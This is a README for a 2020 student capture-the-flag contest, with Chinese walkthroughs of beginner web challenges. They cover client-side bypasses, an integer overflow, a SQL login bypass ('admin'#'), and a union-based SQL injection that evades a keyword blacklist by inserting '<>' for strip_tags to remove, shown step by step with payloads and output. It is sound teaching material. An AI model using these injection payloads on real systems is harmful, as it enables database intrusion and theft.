# dutctf
dutctf2020 source code
* 
## notes
The challenges in this repo are real simple, with the goal of popularizing information security knowledge.
[web1](#web-tutorial)
[web2](#web1)
[web2](#web2)
[vol_time_1](#vol_time_1)
[vol_time_2](#vol_time_2)
[web5](#web5)

---- 
## web-tutorial 
### 方法1 
审查元素，发现按钮被禁用，去除disabled属性后点击按钮获得flag
### 方法2 
检查html源代码发现引用了web1.js，查看web1.js直接获得flag

---- 
## web1 
### 方法1  
审查元素，去除button的id=button1属性（或其他属性，如onmouseover或直接禁用相应css）后点击按钮获得flag
### 方法2
检查html源代码发现引用了混淆过的web2.js，上网寻找js反混淆器，对web2.js反混淆，直接获得flag

---- 
## web2
题目用golang编写，存放用户余额的变量用了int32（-2,147,483,648 到 2,147,483,647），且对用户输入过滤不完整，允许负整数输入，故输入超大负整数
以造成溢出（如-123123123），余额足够后购买flag

---- 
## vol_time_1
题目提示很明确，最基本的sql注入，原语句为`"SELECT * from user WHERE account='$username' AND psw='$password' LIMIT 0,1";`，核心为通过闭合引号或闭合引号并添加注释
来对原有的sql语句转义。提示中提到用“admin”账号登录，故构造payload：用户名为admin'#，则实际执行的sql语句为`SELECT * from user WHERE account=admin`，成功返回一条结果，
成功进入管理页面。

----
## vol_time_2
这是一道稍复杂的ctf sql注入题，首先尝试进行查询，发现只能查学号1，2，3的用户，且关键字如select，union等被过滤，故使用路径扫描器，如[dirsearch.py](https://github.com/maurosoria/dirsearch)，发现在项目根目录下有www.zip此处模拟的是开发者在上传源码后未将源码压缩包删除且nginx配置不合理），打开发现是个mvc架构的php应用，
进入controllers文件夹发现只有一个有效控制器Vol.php。
```
$num = $_POST['number'];             
//$num = intval($num);    //转下数据类型
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value){
   if (substr_count($num, $value) > 0){
      exit('包含敏感关键字！');
   }
}
$sum = strip_tags($num);
$sql = "SELECT * from vt_bak WHERE stu_id={$num} LIMIT 1";
```
发现此段代码有逻辑问题，先进行了关键字检查再去除了成对尖括号。这样会导致sel<>ect被过滤成select。发现了漏洞。
同时由于返回的json是用返回纯数字下标数组的query方法生成的，相当于普通有回显的sql注入。
以下为payload：
出数据库:  
number=-1 unio<>n selec<>t 1,2,3,4,5,6,7,8,9,10,database()#
```
{"name":"2","data":"
1<\/p><\/td>

2<\/p><\/td>

4<\/p><\/td>

5<\/p><\/td>

6<\/p><\/td>

8<\/p><\/td>

7<\/p><\/td>

vol_time_2<\/p><\/td><\/tr>","all_time":6}
```
出表名
number=-1+unio<>n+sele<>ct+1,2,3,4,5,6,7,8,9,10,concat(group_concat(distinct+tab<>le_name))+fro<>m+info<>rmation_schema.ta<>bles+where+ta<>ble_sche<>ma='vol_time_2'#
```
{"name":"2","data":"
1<\/p><\/td>

2<\/p><\/td>

4<\/p><\/td>

5<\/p><\/td>

6<\/p><\/td>

8<\/p><\/td>

7<\/p><\/td>

flag,vt_bak<\/p><\/td><\/tr>","all_time":6}
```
发现flag表，出flag表列名
number=-1+uni<>on+sele<>ct 1,2,3,4,5,6,7,8,9,10,concat(group_concat(distinct+col<>umn_name))+f<>rom+info<>rmation_sc<>hema.colu<>m<>ns+where+tab<>le_schema="vol_time_2" a<>nd tab<>le_na<>me="fl<>ag"#+
```
{"name":"2","data":"
1<\/p><\/td>

2<\/p><\/td>

4<\/p><\/td>

5<\/p><\/td>

6<\/p><\/td>

8<\/p><\/td>

7<\/p><\/td>

flag,id<\/p><\/td><\/tr>","all_time":6}
```
发现flag字段，出内容
number=-1 uni<>on se<>lect 1,2,3,4,5,6,7,8,9,10,fla<>g fro<>m fl<>ag
```
{"name":"2","data":"
1<\/p><\/td>

2<\/p><\/td>

4<\/p><\/td>

5<\/p><\/td>

6<\/p><\/td>

8<\/p><\/td>

7<\/p><\/td>

dutctf{simple_logic_error}<\/p><\/td><\/tr>","all_time":6}
```
## web5 明天放
